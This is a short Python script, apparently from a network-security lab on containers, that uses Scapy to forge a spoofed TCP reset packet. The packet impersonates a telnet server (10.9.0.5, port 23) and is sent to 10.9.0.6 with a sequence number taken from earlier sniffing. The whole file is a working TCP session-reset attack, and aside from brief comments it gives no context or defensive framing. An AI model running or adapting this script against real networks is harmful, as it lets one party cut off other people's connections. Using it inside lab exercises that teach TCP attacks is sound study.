#!/bin/python3
from scapy.all import *
from random import randrange
import sys

# Fill with values found during analysis
intDestinationPort = 35998
intNextSequenceNumber = 5737490

# Targeting victim/server container's telnet port
strSourceIP = "10.9.0.5"
strDestinationIP = "10.9.0.6"
intSourcePort =  23

# Build the IP layer of the packet
lyrIP = IP(src=strSourceIP, dst=strDestinationIP)

# Build TCP layer of the packet
lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="R", seq=intNextSequenceNumber)

# Build the full packet and show it
pktResetPacket = lyrIP / lyrTCP
pktResetPacket.show()

# Send the packet
send(pktResetPacket, verbose=0)
